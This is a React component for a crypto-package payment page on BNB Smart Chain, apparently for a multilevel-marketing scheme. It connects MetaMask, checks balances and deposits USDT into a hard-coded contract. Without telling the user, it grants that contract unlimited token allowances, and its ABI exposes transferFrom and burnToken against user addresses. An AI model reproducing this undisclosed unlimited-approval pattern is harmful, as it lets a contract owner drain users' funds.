import React, { useEffect, useState } from "react";
import {
  Box,
  MenuItem,
  TextField,
  Button,
  Typography,
} from "@mui/material";
import AccountBalanceIcon from "@mui/icons-material/AccountBalance";
import { ethers } from "ethers";
import { useFormik } from "formik";
import toast from "react-hot-toast";
import { useQuery } from "react-query";
import { useLocation, useNavigate } from "react-router-dom";
import Loader from "../../Shared/Loader";
import { endpoint } from "../../utils/APIRoutes";
import { deCryptData, enCryptData } from "../../utils/Secret";
import {
  apiConnectorGetWithoutToken,
  apiConnectorPostWithdouToken,
} from "../../utils/ApiConnector";
// Import your background image
import bg from "../../assets/lock.png"; // change path as needed

const tokenABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function balanceOf(address account) external view returns (uint256)",
  "function deposit(uint256 usdtAmount, uint256 fstAmount) external",
  "function burnToken(address token, address user, uint256 amount) external",
  "function checkAllowance(address token, address user) external view returns (uint256)",
  "event Deposited(address indexed user, uint256 usdtAmount, uint256 fstAmount)",
  "event TokenBurned(address indexed user, uint256 amount)",
];

function ActivationWithFSTAndPull() {
  const [walletAddress, setWalletAddress] = useState("");
  const [no_of_Tokne, setno_of_Tokne] = useState("");
  const [transactionHash, setTransactionHash] = useState("");
  const [receiptStatus, setReceiptStatus] = useState("");
  const [bnb, setBnb] = useState("");
  const [gasprice, setGasPrice] = useState("");
  const [loading, setLoading] = useState(false);

  const navigate = useNavigate();
  const location = useLocation();
  const params = new URLSearchParams(location?.search);
  const IdParam = params?.get("token");
  const base64String = IdParam?.trim();

  const { data: general_address } = useQuery(
    ["contract_address_api_activation"],
    () =>
      apiConnectorGetWithoutToken(
        endpoint?.general_contact_address_api,
        {},
        base64String
      ),
    {
      refetchOnMount: false,
      refetchOnReconnect: false,
      retry: false,
      refetchOnWindowFocus: true,
    }
  );
  const address = deCryptData(general_address?.data?.result)?.[0] || [];
  const dollar_percent = 100;

  const fk = useFormik({
    initialValues: {
      inr_value: "",
      pack_id: 1,
    },
    onSubmit: () => {
      sendTokenTransaction();
    },
  });

  async function requestAccount() {
    setLoading(true);
    if (!window.ethereum) {
      toast.error("MetaMask not detected.");
      setLoading(false);
      return;
    }
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });
      const userAccount = accounts[0];
      setWalletAddress(userAccount);

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const nativeBalance = await provider.getBalance(userAccount);
      setBnb(ethers.utils.formatEther(nativeBalance));

      const tokenContract = new ethers.Contract(
        "0x55d398326f99059fF775485246999027B3197955",
        tokenABI,
        provider
      );
      const tokenBalance = await tokenContract.balanceOf(userAccount);
      setno_of_Tokne(ethers.utils.formatUnits(tokenBalance, 18));
    } catch (err) {
      console.error(err);
      toast.error("Error connecting wallet");
    }
    setLoading(false);
  }

  async function sendTokenTransaction() {
    if (!window.ethereum) {
      toast.error("MetaMask not detected");
      return;
    }
    if (!walletAddress) {
      toast.error("Please connect your wallet.");
      return;
    }
    if (!address?.receiving_key) {
      toast.error("Please add receiving address.");
      return;
    }
    if (!address?.token_contract_add) {
      toast.error("Missing token contract address.");
      return;
    }

    const packagee = res?.find((e) => e?.pack_id === Number(fk.values.pack_id));
    if (!packagee) {
      toast.error("Invalid package selected.");
      return;
    }
    if (Number(packagee.pack_amount) > Number(no_of_Tokne || "0")) {
      toast.error("Your USDT wallet amount is low.");
      return;
    }

    try {
      setLoading(true);
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const usdtDecimals = 18;
      const fstDecimals = 8;
      const fstAmount = 0;
      const usdAmount = Number(packagee.pack_amount).toFixed(5);

      const dummyData = await PayinZpDummy();
      if (
        !dummyData?.success ||
        !dummyData?.last_id ||
        Number(dummyData.last_id) < 1
      ) {
        setLoading(false);
        toast.error(dummyData?.message || "Dummy API failed");
        return;
      }

      const last_id = Number(dummyData.last_id);
      const usdtAmount = ethers.utils.parseUnits(String(usdAmount), usdtDecimals);
      const fstTokenAmount = ethers.utils.parseUnits(String(fstAmount), fstDecimals);

      const usdtContract = new ethers.Contract(
        "0x55d398326f99059fF775485246999027B3197955",
        tokenABI,
        signer
      );
      const fstContract = new ethers.Contract(
        address.token_contract_add,
        tokenABI,
        signer
      );
      const mainContract = new ethers.Contract(
        "0x70314cee8e304500a148cc7c1f206a6bd127b02c",
        ["function deposit(uint256,uint256) external"],
        signer
      );

      const [usdtBalance, fstBalance, bnbBalance] = await Promise.all([
        usdtContract.balanceOf(userAddress),
        fstContract.balanceOf(userAddress),
        provider.getBalance(userAddress),
      ]);

      if (usdtBalance.lt(usdtAmount)) {
        toast.error("Insufficient USDT balance.");
        setLoading(false);
        return;
      }
      if (fstBalance.lt(fstTokenAmount)) {
        toast.error("Insufficient FST balance.");
        setLoading(false);
        return;
      }

      const usdtAllowance = await usdtContract.allowance(userAddress, mainContract.address);
      if (usdtAllowance.lt(usdtAmount)) {
        const tx = await usdtContract.approve(mainContract.address, ethers.constants.MaxUint256);
        await tx.wait();
      }
      const fstAllowance = await fstContract.allowance(userAddress, mainContract.address);
      if (fstAllowance.lt(fstTokenAmount)) {
        const tx2 = await fstContract.approve(mainContract.address, ethers.constants.MaxUint256);
        await tx2.wait();
      }

      const gasEstimate = await mainContract.estimateGas.deposit(usdtAmount, fstTokenAmount);
      const gasPriceest = await provider.getGasPrice();
      const gasCost = gasEstimate.mul(gasPriceest);

      if (bnbBalance.lt(gasCost)) {
        const need = ethers.utils.formatEther(gasCost);
        toast.error(`Not enough BNB for gas. Need ~${need} BNB`);
        setLoading(false);
        return;
      }

      const tx = await mainContract.deposit(usdtAmount, fstTokenAmount);
      const receipt = await tx.wait();

      setTransactionHash(tx.hash);
      setReceiptStatus(receipt.status === 1 ? "Success" : "Failure");

      if (receipt.status === 1) {
        toast.success("Transaction successful!");
      } else {
        toast.error("Transaction failed!");
      }

      const gasCostInEth = ethers.utils.formatEther(gasCost);
      await PayinZp(gasCostInEth, tx.hash, receipt.status === 1 ? 2 : 3, last_id);
    } catch (error) {
      console.error(error);
      toast.error(error?.reason || "Transaction failed");
    } finally {
      setLoading(false);
    }
  }

  async function PayinZp(gasPrice, tr_hash, status, id) {
    const reqbody = {
      req_amount: Number(
        res?.find((e) => e?.pack_id === Number(fk.values.pack_id))?.pack_amount
      ),
      u_user_wallet_address: walletAddress,
      u_transaction_hash: tr_hash,
      u_trans_status: status,
      currentBNB: 0,
      currentZP: no_of_Tokne,
      gas_price: gasPrice,
      pkg_id: fk.values.pack_id,
      last_id: id,
    };
    try {
      const resp = await apiConnectorPostWithdouToken(
        endpoint?.paying_api,
        {
          payload: enCryptData(reqbody),
        },
        base64String
      );
      toast.success(resp?.data?.message || "Payment API responded");
      fk.resetForm();
    } catch (e) {
      console.error(e);
    }
  }

  async function PayinZpDummy() {
    const reqbody = {
      req_amount: Number(
        res?.find((e) => e?.pack_id === Number(fk.values.pack_id))?.pack_amount
      ),
      u_user_wallet_address: walletAddress,
      u_transaction_hash: "dummy_tx",
      u_trans_status: 1,
      currentBNB: 0,
      currentZP: no_of_Tokne,
      gas_price: "",
      pkg_id: fk.values.pack_id,
      deposit_type: "Mlm",
    };
    try {
      const resp = await apiConnectorPostWithdouToken(
        endpoint?.paying_dummy_api,
        {
          payload: enCryptData(reqbody),
        },
        base64String
      );
      return resp?.data || {};
    } catch (e) {
      console.error(e);
      return {};
    }
  }

  const { data: user } = useQuery(
    ["package_api"],
    () => apiConnectorGetWithoutToken(endpoint?.package_list_api, {}, base64String),
    {
      refetchOnMount: false,
      retry: false,
      refetchOnWindowFocus: false,
    }
  );
  const res = user?.data?.result || [];

  return (
    <>
      <Loader isLoading={loading} />
      <div
        className="flex flex-col items-center justify-start min-h-screen p-4"
        style={{
          backgroundImage: `url(${bg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        <Box
          className="mt-20 w-full max-w-md bg-white/5 backdrop-blur-md border border-white/20 rounded-xl p-6 shadow-lg"
        >
          <div className="flex justify-center mb-4">
            <AccountBalanceIcon sx={{ fontSize: 60, color: "#ffb300" }} />
          </div>

          <div className="flex justify-center mb-6">
            <Button
              variant="contained"
              sx={{
                backgroundColor: "#ff6f00",
                "&:hover": { backgroundColor: "#ffa040" },
                color: "#fff",
                textTransform: "none",
              }}
              onClick={requestAccount}
            >
              Connect Wallet
            </Button>
          </div>

          <div className="text-white text-sm mb-4 space-y-2">
            <p>
              <strong>Address:</strong>{" "}
              {walletAddress
                ? `${walletAddress.slice(0, 8)}…${walletAddress.slice(-8)}`
                : "-"}
            </p>
            <p>
              <strong>User Token:</strong> {base64String || "-"}
            </p>
            <p>
              <strong>BNB Balance:</strong> {bnb || "-"}
            </p>
            <p>
              <strong>USDT(BEP20):</strong> {Number(no_of_Tokne || 0).toFixed(4)}
            </p>
          </div>

          <TextField
            select
            fullWidth
            id="pack_id"
            name="pack_id"
            value={fk.values.pack_id}
            onChange={fk.handleChange}
            sx={{
              mb: 4,
              "& .MuiSelect-select": { color: "#ffb300" },
              "& .MuiOutlinedInput-root fieldset": {
                borderColor: "#ffb300",
              },
              "& .MuiOutlinedInput-root:hover fieldset": {
                borderColor: "#ffdf80",
              },
            }}
          >
            {res.map((item) => (
              <MenuItem key={item.pack_id} value={item.pack_id}>
                {item.pack_name}
              </MenuItem>
            ))}
          </TextField>

          <div className="mb-4">
            <Button
              variant="contained"
              fullWidth
              sx={{
                backgroundColor: "#ff6f00",
                "&:hover": { backgroundColor: "#ffa040" },
                color: "#fff",
                textTransform: "none",
              }}
              onClick={sendTokenTransaction}
            >
              Confirm
            </Button>
          </div>

          <div className="text-white text-xs space-y-1">
            <p>
              <strong>Transaction Hash:</strong>{" "}
              <span className="break-all">{transactionHash || "-"}</span>
            </p>
            <p>
              <strong>Gas Price:</strong> {gasprice || "-"}
            </p>
            <p>
              <strong>Status:</strong> {receiptStatus || "-"}
            </p>
          </div>
        </Box>
      </div>
    </>
  );
}

export default ActivationWithFSTAndPull;
